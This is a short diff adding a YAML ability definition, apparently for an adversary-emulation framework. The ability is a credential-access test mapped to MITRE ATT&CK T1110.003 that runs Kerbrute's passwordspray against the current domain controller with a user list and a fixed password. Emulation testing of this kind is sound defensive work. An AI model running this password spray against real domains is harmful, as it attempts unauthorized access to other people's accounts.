@@ -1,0 +1,21 @@
+---
+- id: e5168b0f7e57ba7b20c9842a350bb539
+  name: Password Spray using Kerbrute Tool
+  description: 'Test a single password against a list of users
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: 'Brute Force: Password Spraying'
+  platforms:
+    windows:
+      psh:
+        command: cd "PathToAtomicsFolder\..\ExternalPayloads"; .\kerbrute.exe passwordspray
+          --dc $ENV:userdnsdomain -d $ENV:userdomain "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"
+          password132
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
